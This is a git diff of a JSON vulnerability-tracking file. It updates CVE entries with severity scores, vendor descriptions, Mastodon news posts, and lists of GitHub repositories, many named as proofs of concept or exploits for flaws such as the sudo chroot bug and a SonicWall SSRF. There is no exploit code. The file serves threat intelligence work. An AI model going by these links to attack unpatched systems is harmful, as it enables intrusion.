-        "content": "<h2>Defensive Security Podcast Episode 355</h2>\n\n <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" rel=\"nofollow noopener\" target=\"_blank\">https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3</a> <p>Podcast: <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" class=\"\" title=\"Play in new window\" rel=\"nofollow noopener\" target=\"_blank\">Play in new window</a> | <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" class=\"\" title=\"Download\" rel=\"nofollow noopener\" target=\"_blank\">Download</a> | Embed</p><p></p><p>Subscribe: <a href=\"https://defensivesecurity.org/feed/podcast/\" class=\"\" title=\"Subscribe via RSS\" rel=\"nofollow noopener\" target=\"_blank\">RSS</a></p><p><a href=\"https://www.youtube.com/watch?v=LL0ez4JXGWE\" rel=\"nofollow noopener\" target=\"_blank\">https://www.youtube.com/watch?v=LL0ez4JXGWE</a></p><p><a href=\"https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">helpnetsecurity.com/2026/07/21</span><span class=\"invisible\">/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/</span></a><br><a href=\"https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">thehackernews.com/2026/07/qili</span><span class=\"invisible\">n-ransomware-attackers-exploit-pan.html</span></a><br><a href=\"https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">thehackernews.com/2026/07/worl</span><span class=\"invisible\">ds-largest-ai-model-repository.html</span></a><br><a href=\"https://openai.com/index/hugging-face-model-evaluation-security-incident/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">openai.com/index/hugging-face-</span><span class=\"invisible\">model-evaluation-security-incident/</span></a><br><a href=\"https://www.darkreading.com/identity-access-management-security/identity-attacks-overtake-exploits-top-ransomware-cause\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">darkreading.com/identity-acces</span><span class=\"invisible\">s-management-security/identity-attacks-overtake-exploits-top-ransomware-cause</span></a><br><a href=\"https://www.helpnetsecurity.com/2026/07/21/estee-lauder-data-breach-oracle-ebs/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">helpnetsecurity.com/2026/07/21</span><span class=\"invisible\">/estee-lauder-data-breach-oracle-ebs/</span></a></p>\n\n",
-        "created_at": "2026-08-08T19:16:44.000Z"
-      }
-    ],
-    "description": "A Server-side request forgery (SSRF) vulnerability has been identified in the SMA1000 Appliance Work Place interface. A remote unauthenticated attacker could potentially cause the appliance to make requests to unintended location.",
-    "repos": [
-      "https://github.com/HORKimhab/CVE-2026-15409",
-      "https://github.com/tc4dy/CVE-2026-15409-15410-Framework",
-      "https://github.com/remmons-r7/rapid7-CVE-2026-15409",
-      "https://github.com/MrRawBit/SonicWall-SMA1000-Zero-Day-IoC-Check",
-      "https://github.com/0xBlackash/CVE-2026-15409",
-      "https://github.com/Ch4120N/CVE-2026-15409"
-    ],
-    "updated": "2026-07-16T05:16:18.293000",
-    "epss": 78.44
   },
   "CVE-2026-60004": {
     "cvss3": 0,
@@ -10989,14 +10989,14 @@
     ],
     "description": "N/A",
     "repos": [
-      "https://github.com/HackSpeak/CVE-2026-60004",
+      "https://github.com/EQSTLab/CVE-2026-60004",
+      "https://github.com/imbas007/CVE-2026-60004-POC",
       "https://github.com/HORKimhab/CVE-2026-60004",
       "https://github.com/0xBlackash/CVE-2026-60004",
       "https://github.com/gagaltotal/CVE-2026-60004-poc-gitea",
-      "https://github.com/Sachinart/CVE-2026-60004-gitea-0day",
-      "https://github.com/imbas007/CVE-2026-60004-POC",
+      "https://github.com/HackSpeak/CVE-2026-60004",
       "https://github.com/shinthink/CVE-2026-60004",
-      "https://github.com/EQSTLab/CVE-2026-60004"
+      "https://github.com/Sachinart/CVE-2026-60004-gitea-0day"
     ],
     "updated": null,
     "epss": 0
@@ -11169,9 +11169,9 @@
         "created_at": "2026-08-07T17:50:53.000Z"
       }
     ],
-    "description": "A vulnerability in the PESpin file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\n\nThis vulnerability is due to improper boundary checks for content in PESpin files during scanning, which may result in an integer overflow. An attacker could exploit this vulnerability by submitting a crafted file that contains PESpin content to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
+    "description": "A vulnerability in the PESpin file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\r\n\r\nThis vulnerability is due to improper boundary checks for content in PESpin files during scanning, which may result in an integer overflow. An attacker could exploit this vulnerability by submitting a crafted file that contains PESpin content to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
     "repos": [],
-    "updated": "2026-08-07T18:31:54",
+    "updated": "2026-08-07T22:16:57.707000",
     "epss": 0.327
   },
   "CVE-2026-71954": {
@@ -11364,85 +11364,85 @@
     ],
     "description": "Sudo before 1.9.17p1 allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.",
     "repos": [
-      "https://github.com/blackcat4347/CVE-2025-32463_PoC",
-      "https://github.com/ricardomaia/CVE-2025-32463",
-      "https://github.com/0p5cur/CVE-2025-32463-POC",
-      "https://github.com/lakshan-sameera/CVE-2025-32462-and-CVE-2025-32463---Critical-Sudo-Vulnerabilities",
-      "https://github.com/MAAYTHM/CVE-2025-32462_32463-Lab",
-      "https://github.com/abrewer251/CVE-2025-32463_Sudo_PoC",
-      "https://github.com/shazed-x/CVE-2025-32463",
-      "https://github.com/kh4sh3i/CVE-2025-32463",
-      "https://github.com/12bijaya/CVE-2025-32463",
-      "https://github.com/ill-deed/CVE-2025-32463_illdeed",
-      "https://github.com/7r00t/cve-2025-32463-lab",
-      "https://github.com/AdityaBhatt3010/Sudo-Privilege-Escalation-Linux-CVE-2025-32463-and-CVE-2025-32462",
-      "https://github.com/zinzloun/CVE-2025-32463",
-      "https://github.com/Rajneeshkarya/CVE-2025-32463",
-      "https://github.com/onniio/CVE-2025-32463",
-      "https://github.com/khoazero123/CVE-2025-32463",
-      "https://github.com/0xdak/CVE-2025-32463_exploit",
-      "https://github.com/4f-kira/CVE-2025-32463",
-      "https://github.com/Yuy0ung/CVE-2025-32463_chwoot",
-      "https://github.com/y4ney/CVE-2025-32463-lab",
-      "https://github.com/cybertechajju/CVE-2025-32463",
-      "https://github.com/dr4xp/sudo-chroot",
-      "https://github.com/daryllundy/CVE-2025-32463",
-      "https://github.com/yonathanpy/CVE-2025-32462-CVE-2025-32463-PoC-Lab",
-      "https://github.com/NewComrade12211/CVE-2025-32463",
-      "https://github.com/Mr-Alperen/CVE-2025-32463",
-      "https://github.com/ashardev002/CVE-2025-32463_chwoot",
-      "https://github.com/Mikivirus0/sudoinjection",
-      "https://github.com/FreeDurok/CVE-2025-32463-PoC",
-      "https://github.com/ChetanKomal/sudo_exploit",
-      "https://github.com/zhaduchanhzz/CVE-2025-32463_POC",
-      "https://github.com/secvulnhub/CVE-2025-32463-EXPLOIT",
-      "https://github.com/IC3-512/linux-root-kit",
-      "https://github.com/gmh5225/Blackash-CVE-2025-32463",
       "https://github.com/MGunturG/CVE-2025-32463",
-      "https://github.com/san8383/CVE-2025-32463",
-      "https://github.com/painoob/CVE-2025-32463",
-      "https://github.com/SpycioKon/CVE-2025-32463",
-      "https://github.com/hackingyseguridad/root",
-      "https://github.com/CIA911/sudo_patch_CVE-2025-32463",
-      "https://github.com/dr4x-c0d3r/sudo-chroot",
-      "https://github.com/robbert1978/CVE-2025-32463_POC",
-      "https://github.com/aldoClau98/CVE-2025-32463",
-      "https://github.com/v3rycl0p3r/CVE-2025-32463",
-      "https://github.com/danilo1992-sys/CVE-2025-32463",
-      "https://github.com/harsh1verma/CVE-Analysis",
-      "https://github.com/1xPwn/CVE-2025-32463",
-      "https://github.com/morgenm/sudo-chroot-CVE-2025-32463",
-      "https://github.com/krypton-0x00/CVE-2025-32463-Chwoot-POC",
-      "https://github.com/Ghstxz/CVE-2025-32463",
-      "https://github.com/mirchr/CVE-2025-32463-sudo-chwoot",
-      "https://github.com/Fomovet/cve-2025-32463",
-      "https://github.com/lowercasenumbers/CVE-2025-32463_sudo_chroot",
-      "https://github.com/Maalfer/Sudo-CVE-2021-3156",
-      "https://github.com/D3ltaFormation/CVE-2025-32463-Sudo-Chroot-Escape",
-      "https://github.com/0xBlackash/CVE-2025-32463",
-      "https://github.com/toohau/CVE-2025-32462-32463-Detection-Script-",
+      "https://github.com/dr4xp/sudo-chroot",
+      "https://github.com/12bijaya/CVE-2025-32463",
       "https://github.com/0xAkarii/CVE-2025-32463",
-      "https://github.com/robbin0919/CVE-2025-32463",
-      "https://github.com/neko205-mx/CVE-2025-32463_Exploit",
-      "https://github.com/ankitpandey383/CVE-2025-32463-Sudo-Privilege-Escalation",
-      "https://github.com/pr0v3rbs/CVE-2025-32463_chwoot",
-      "https://github.com/K1tt3h/CVE-2025-32463-POC",
-      "https://github.com/MohamedKarrab/CVE-2025-32463",
-      "https://github.com/r3dBust3r/CVE-2025-32463",
-      "https://github.com/0x3c4dfa1/CVE-2025-32463",
-      "https://github.com/SpongeBob-369/cve-2025-32463",
-      "https://github.com/KaiHT-Ladiant/CVE-2025-32463",
       "https://github.com/AC8999/CVE-2025-32463",
-      "https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT",
+      "https://github.com/v3rycl0p3r/CVE-2025-32463",
+      "https://github.com/0xdak/CVE-2025-32463_exploit",
+      "https://github.com/morgenm/sudo-chroot-CVE-2025-32463",
+      "https://github.com/CIA911/sudo_patch_CVE-2025-32463",
+      "https://github.com/Mr-Alperen/CVE-2025-32463",
+      "https://github.com/behnamvanda/CVE-2025-32463",
+      "https://github.com/ricardomaia/CVE-2025-32463",
+      "https://github.com/K1tt3h/CVE-2025-32463-POC",
+      "https://github.com/robbin0919/CVE-2025-32463",
+      "https://github.com/lakshan-sameera/CVE-2025-32462-and-CVE-2025-32463---Critical-Sudo-Vulnerabilities",
+      "https://github.com/SpongeBob-369/cve-2025-32463",
       "https://github.com/SysMancer/CVE-2025-32463",
-      "https://github.com/justjoeyking/CVE-2025-32463",
-      "https://github.com/vpr-labs/CVE-2025-32463",
-      "https://github.com/0x00315732/musical-engine",
-      "https://github.com/pevinkumar10/CVE-2025-32463",
+      "https://github.com/robbert1978/CVE-2025-32463_POC",
+      "https://github.com/painoob/CVE-2025-32463",
+      "https://github.com/IC3-512/linux-root-kit",
+      "https://github.com/KaiHT-Ladiant/CVE-2025-32463",
+      "https://github.com/0p5cur/CVE-2025-32463-POC",
+      "https://github.com/pr0v3rbs/CVE-2025-32463_chwoot",
+      "https://github.com/blackcat4347/CVE-2025-32463_PoC",
+      "https://github.com/MohamedKarrab/CVE-2025-32463",
+      "https://github.com/Yuy0ung/CVE-2025-32463_chwoot",
+      "https://github.com/7r00t/cve-2025-32463-lab",
+      "https://github.com/zinzloun/CVE-2025-32463",
+      "https://github.com/ChetanKomal/sudo_exploit",
+      "https://github.com/neko205-mx/CVE-2025-32463_Exploit",
+      "https://github.com/FreeDurok/CVE-2025-32463-PoC",
+      "https://github.com/gmh5225/Blackash-CVE-2025-32463",
+      "https://github.com/toohau/CVE-2025-32462-32463-Detection-Script-",
+      "https://github.com/abrewer251/CVE-2025-32463_Sudo_PoC",
+      "https://github.com/1xPwn/CVE-2025-32463",
+      "https://github.com/Maalfer/Sudo-CVE-2021-3156",
       "https://github.com/muhammedkayag/CVE-2025-32463",
-      "https://github.com/behnamvanda/CVE-2025-32463"
+      "https://github.com/4f-kira/CVE-2025-32463",
+      "https://github.com/Ghstxz/CVE-2025-32463",
+      "https://github.com/ill-deed/CVE-2025-32463_illdeed",
+      "https://github.com/lowercasenumbers/CVE-2025-32463_sudo_chroot",
+      "https://github.com/MAAYTHM/CVE-2025-32462_32463-Lab",
+      "https://github.com/daryllundy/CVE-2025-32463",
+      "https://github.com/cybertechajju/CVE-2025-32463",
+      "https://github.com/krypton-0x00/CVE-2025-32463-Chwoot-POC",
+      "https://github.com/zhaduchanhzz/CVE-2025-32463_POC",
+      "https://github.com/NewComrade12211/CVE-2025-32463",
+      "https://github.com/san8383/CVE-2025-32463",
+      "https://github.com/ashardev002/CVE-2025-32463_chwoot",
+      "https://github.com/AdityaBhatt3010/Sudo-Privilege-Escalation-Linux-CVE-2025-32463-and-CVE-2025-32462",
+      "https://github.com/justjoeyking/CVE-2025-32463",
+      "https://github.com/y4ney/CVE-2025-32463-lab",
+      "https://github.com/0x3c4dfa1/CVE-2025-32463",
+      "https://github.com/Mikivirus0/sudoinjection",
+      "https://github.com/pevinkumar10/CVE-2025-32463",
+      "https://github.com/yonathanpy/CVE-2025-32462-CVE-2025-32463-PoC-Lab",
+      "https://github.com/onniio/CVE-2025-32463",
+      "https://github.com/0xBlackash/CVE-2025-32463",
+      "https://github.com/SpycioKon/CVE-2025-32463",
+      "https://github.com/ankitpandey383/CVE-2025-32463-Sudo-Privilege-Escalation",
+      "https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT",
+      "https://github.com/vpr-labs/CVE-2025-32463",
+      "https://github.com/danilo1992-sys/CVE-2025-32463",
+      "https://github.com/secvulnhub/CVE-2025-32463-EXPLOIT",
+      "https://github.com/0x00315732/musical-engine",
+      "https://github.com/shazed-x/CVE-2025-32463",
+      "https://github.com/khoazero123/CVE-2025-32463",
+      "https://github.com/mirchr/CVE-2025-32463-sudo-chwoot",
+      "https://github.com/harsh1verma/CVE-Analysis",
+      "https://github.com/kh4sh3i/CVE-2025-32463",
+      "https://github.com/Rajneeshkarya/CVE-2025-32463",
+      "https://github.com/hackingyseguridad/root",
+      "https://github.com/r3dBust3r/CVE-2025-32463",
+      "https://github.com/D3ltaFormation/CVE-2025-32463-Sudo-Chroot-Escape",
+      "https://github.com/aldoClau98/CVE-2025-32463",
+      "https://github.com/dr4x-c0d3r/sudo-chroot",
+      "https://github.com/Fomovet/cve-2025-32463"
     ],
-    "updated": "2026-06-17T09:12:02.147000",
+    "updated": "2025-10-22T00:34:26",
     "epss": 56.337
   },
   "CVE-2026-71851": {
@@ -11761,7 +11761,7 @@
     ],
     "description": "A vulnerability was detected in DeepCool DisplayService 1.2.12. This issue affects some unknown processing of the file C:\\DeepCool\\resources\\service\\x64\\DeepCoolDisplayService.exe. Performing a manipulation results in improper access controls. The attack must be initiated from a local position. The exploit is now public and may be used.",
     "repos": [],
-    "updated": "2026-08-07T06:30:27",
+    "updated": "2026-08-08T03:16:45.610000",
     "epss": 0.109
   },
   "CVE-2026-19191": {
@@ -11881,7 +11881,7 @@
     ],
     "description": "A security vulnerability has been detected in StableBit DrivePool 2.3.13.1687. This vulnerability affects unknown code of the file C:\\Program Files\\StableBit\\DrivePool\\DrivePool.Service.exe of the component DrivePoolService. Such manipulation leads to permission issues. The attack must be carried out locally. The exploit has been disclosed publicly and may be used.",
     "repos": [],
-    "updated": "2026-08-07T18:17:12.073000",
+    "updated": "2026-08-07T06:30:26",
     "epss": 0.109
   },
   "CVE-2026-14943": {
@@ -12121,7 +12121,7 @@
     ],
     "description": "A heap-based buffer overflow vulnerability exists in the GIMP DDS (DirectDraw Surface) file parser. When a crafted DDS file declares a D3D9 pixel format but sets a lower bits-per-pixel (bpp) value in the header, the loader allocates an undersized heap buffer. Subsequent pixel data consumption at the real format's stride causes a write past the heap buffer boundary, leading to heap metadata corruption and potential code execution.",
     "repos": [],
-    "updated": "2026-08-08T18:30:29",
+    "updated": "2026-08-08T16:16:49.093000",
     "epss": 0.187
   },
   "CVE-2026-34348": {
@@ -12153,7 +12153,7 @@
           "header_description": "",
           "followers_count": 198,
           "following_count": 160,
-          "statuses_count": 1416,
+          "statuses_count": 1417,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -12256,7 +12256,7 @@
           "header_description": "",
           "followers_count": 198,
           "following_count": 160,
-          "statuses_count": 1416,
+          "statuses_count": 1417,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -12459,7 +12459,7 @@
     ],
     "description": "The WP Events Manager WordPress plugin before 2.2.5 does not validate the requested quantity when registering for a paid event and computes the price from the attacker-controlled quantity, allowing any authenticated user to create a completed booking for a paid event without making a payment.",
     "repos": [],
-    "updated": "2026-08-07T18:17:07.073000",
+    "updated": "2026-08-07T18:32:48",
     "epss": 0.268
   },
   "CVE-2026-16038": {
@@ -12768,11 +12768,11 @@
     ],
     "description": "The MStore API  WordPress plugin before 4.21.0 does not correctly verify the cryptographic signature of the token used to authenticate its phone-based login, allowing unauthenticated attackers who know a registered user's phone number to forge a token and take over that user's account, including administrator accounts.",
     "repos": [],
-    "updated": "2026-08-07T18:32:49",
+    "updated": "2026-08-07T18:17:09.153000",
     "epss": 0.22599999999999998
   },
   "CVE-2015-6609": {
-    "cvss3": 0,
+    "cvss3": null,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -12908,7 +12908,7 @@
     ],
     "description": "libutils in Android before 5.1.1 LMY48X and 6.0 before 2015-11-01 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted audio file, aka internal bug 22953624.",
     "repos": [],
-    "updated": "2026-06-17T00:31:07.690000",
+    "updated": "2023-01-27T05:08:18",
     "epss": 2.17
   },
   "CVE-2026-20346": {
@@ -13158,7 +13158,7 @@
     ],
     "description": "The Content Views  WordPress plugin before 4.5 does not perform a capability check on one of its AJAX actions and does not properly sanitise attacker-supplied data before using it in a SQL query, allowing any authenticated user, including Subscribers, to perform SQL injection attacks.",
     "repos": [],
-    "updated": "2026-08-07T21:31:36",
+    "updated": "2026-08-07T19:17:35.543000",
     "epss": 0.22100000000000003
   },
   "CVE-2026-15215": {
@@ -13398,7 +13398,7 @@
     ],
     "description": "The WP Maps  WordPress plugin before 4.9.7 does not perform a capability check in one of its AJAX actions and does not properly validate a user-controlled path before using it in a file inclusion, allowing users with a Subscriber account to include and execute arbitrary existing local PHP files on the server.",
     "repos": [],
-    "updated": "2026-08-07T19:17:37.240000",
+    "updated": "2026-08-07T21:31:36",
     "epss": 0.336
   },
   "CVE-2026-20337": {
@@ -13494,7 +13494,7 @@
           "header_description": "",
           "followers_count": 57,
           "following_count": 1,
-          "statuses_count": 1591,
+          "statuses_count": 1592,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -13639,8 +13639,8 @@
     "epss": 0.362
   },
   "CVE-2022-40982": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 6.5,
+    "severity": "MEDIUM",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -13667,7 +13667,7 @@
           "header_description": "",
           "followers_count": 32,
           "following_count": 1,
-          "statuses_count": 25887,
+          "statuses_count": 25888,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -13686,9 +13686,9 @@
         "created_at": "2026-08-08T13:41:25.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "Information exposure through microarchitectural state after transient execution in certain vector execution units for some Intel(R) Processors may allow an authenticated user to potentially enable information disclosure via local access.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-06-17T05:02:20.830000",
     "epss": 3.0220000000000002
   },
   "CVE-2026-16262": {
@@ -13697,60 +13697,6 @@
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
-      {
-        "account": {
-          "id": "115780929223240988",
-          "username": "thehackerwire",
-          "acct": "thehackerwire@mastodon.social",
-          "display_name": "TheHackerWire",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2025-12-21T00:00:00.000Z",
-          "note": "<p>Cybersecurity Chronicles \ud83c\udf10 | Breaking down the latest in security news, <a href=\"https://mastodon.social/tags/hacking\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>hacking</span></a> <a href=\"https://mastodon.social/tags/darkweb\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>darkweb</span></a> <a href=\"https://mastodon.social/tags/Cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cybersecurity</span></a> <a href=\"https://mastodon.social/tags/InfoSec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>InfoSec</span></a> <a href=\"https://mastodon.social/tags/HackingNews\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>HackingNews</span></a></p>",
-          "url": "https://mastodon.social/@thehackerwire",
-          "uri": "https://mastodon.social/ap/users/115755483699003887",
-          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "avatar_description": "",
-          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "header_description": "",
-          "followers_count": 207,
-          "following_count": 2,
-          "statuses_count": 8542,
-          "last_status_at": "2026-08-09",
-          "hide_collections": false,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "public"
-            ],
-            "manual": [],
-            "current_user": "automatic"
-          },
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Website",
-              "value": "<a href=\"https://www.thehackerwire.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">thehackerwire.com/</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            },
-            {
-              "name": "X",
-              "value": "<a href=\"https://x.com/TheHackerWire\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">x.com/TheHackerWire</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://mastodon.social/@thehackerwire/117060010654015049",
-        "content": "<p>\ud83d\udfe0 CVE-2026-16262 - High (7.5)</p><p>The Estatik Real Estate Plugin WordPress plugin before 4.3.3 does not bind its OAuth social login flow to the initiating user session, allowing an unauthenticated attacker to log a victim into an attacker-controlled account (login CSRF), so that t...</p><p>\ud83d\udd17 <a href=\"https://www.thehackerwire.com/vulnerability/CVE-2026-16262/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">thehackerwire.com/vulnerabilit</span><span class=\"invisible\">y/CVE-2026-16262/</span></a></p><p><a href=\"https://mastodon.social/tags/CVE\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CVE</span></a> <a href=\"https://mastodon.social/tags/vulnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vulnerability</span></a> <a href=\"https://mastodon.social/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://mastodon.social/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a> <a href=\"https://mastodon.social/tags/security\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>security</span></a> <a href=\"https://mastodon.social/tags/Tenda\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Tenda</span></a> <a href=\"https://mastodon.social/tags/patchstack\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>patchstack</span></a></p>",
-        "created_at": "2026-08-08T13:00:10.000Z"
-      },
       {
         "account": {
           "id": "115780929217569257",
@@ -13811,132 +13757,12 @@
     "updated": "2026-08-07T21:30:34",
     "epss": 0.158
   },
-  "CVE-2026-18574": {
-    "cvss3": 0,
-    "severity": null,
-    "epss_severity": "LOW",
-    "nuclei": null,
-    "posts": [
-      {
-        "account": {
-          "id": "114450246444709181",
-          "username": "cyberveille",
-          "acct": "cyberveille@mastobot.ping.moi",
-          "display_name": "CyberVeille.ch",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2025-05-04T00:00:00.000Z",
-          "note": "<p>\ud83d\udd0e Cyberveille.ch \u00b7 Veille francophone sur la cybers\u00e9curit\u00e9 (Suisse et monde) \u00b7 Articles s\u00e9lectionn\u00e9s automatiquement \u00b7 G\u00e9r\u00e9 par un humain + bot \ud83e\udd16<br>\ud83d\udcda Source : <a href=\"https://cyberveille.ch\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">cyberveille.ch</span><span class=\"invisible\"></span></a></p>",
-          "url": "https://mastobot.ping.moi/@cyberveille",
-          "uri": "https://mastobot.ping.moi/users/cyberveille",
-          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/114/450/246/444/709/181/original/b70e4721c91acfa2.png",
-          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/114/450/246/444/709/181/original/b70e4721c91acfa2.png",
-          "avatar_description": "",
-          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/114/450/246/444/709/181/original/9d04cdbf514d2c77.png",
-          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/114/450/246/444/709/181/original/9d04cdbf514d2c77.png",
-          "header_description": "",
-          "followers_count": 84,
-          "following_count": 1,
-          "statuses_count": 4842,
-          "last_status_at": "2026-08-08",
-          "hide_collections": false,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "public"
-            ],
-            "manual": [],
-            "current_user": "automatic"
-          },
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Projet",
-              "value": "<a href=\"https://cyberveille.ch/about/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">cyberveille.ch/about/</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            },
-            {
-              "name": "Membre humain",
-              "value": "<span class=\"h-card\" translate=\"no\"><a href=\"https://infosec.exchange/@decio\" class=\"u-url mention\" rel=\"nofollow noopener\" target=\"_blank\">@<span>decio@infosec.exchange</span></a></span>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://mastobot.ping.moi/@cyberveille/117060010342103708",
-        "content": "<p>\ud83d\udce2 Check Point : faille critique d'authentification CVE-2026-18574 sur Security Management Server</p><p>\ud83d\udcf0 Source : Cyber Security News \u2014 Date : 4 ao\u00fbt 2026 Check Point a publi\u00e9 des mises \u00e0 jour de s\u00e9curit\u00e9 pour corriger une vuln\u00e9rabilit\u00e9 de haute s\u00e9v\u00e9rit\u00e9 identifi\u00e9e sous CVE-2026-18574, affectant les environnements Security Management Server et\u2026</p><p>\ud83d\udcd6 cyberveille : <a href=\"https://cyberveille.ch/posts/2026-08-08-check-point-faille-critique-d-authentification-cve-2026-18574-sur-security-management-server/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">cyberveille.ch/posts/2026-08-0</span><span class=\"invisible\">8-check-point-faille-critique-d-authentification-cve-2026-18574-sur-security-management-server/</span></a><br>\ud83c\udf10 source : <a href=\"https://cybersecuritynews.com/check-point-authentication-bypass-flaw/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">cybersecuritynews.com/check-po</span><span class=\"invisible\">int-authentication-bypass-flaw/</span></a><br>\ud83d\udfe1 v\u00e9rification factuelle moyenne<br><a href=\"https://mastobot.ping.moi/tags/CheckPoint\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CheckPoint</span></a> <a href=\"https://mastobot.ping.moi/tags/AuthenticationBypass\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>AuthenticationBypass</span></a> <a href=\"https://mastobot.ping.moi/tags/Cyberveille\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cyberveille</span></a></p>",
-        "created_at": "2026-08-08T13:00:05.000Z"
-      }
-    ],
-    "description": "An authentication bypass vulnerability in Check Point Security Management Server and Multi-Domain Security Management Server (MDS) could allow an unauthenticated remote attacker with network access to Management services to execute arbitrary commands on the Security Management Server. Successful exploitation could result in full compromise of the Security Management system. Check Point discovered this issue internally and has no indication of active exploitation.",
-    "repos": [],
-    "updated": "2026-08-05T05:16:47.433000",
-    "epss": 0.991
-  },
   "CVE-2026-16258": {
     "cvss3": 9.8,
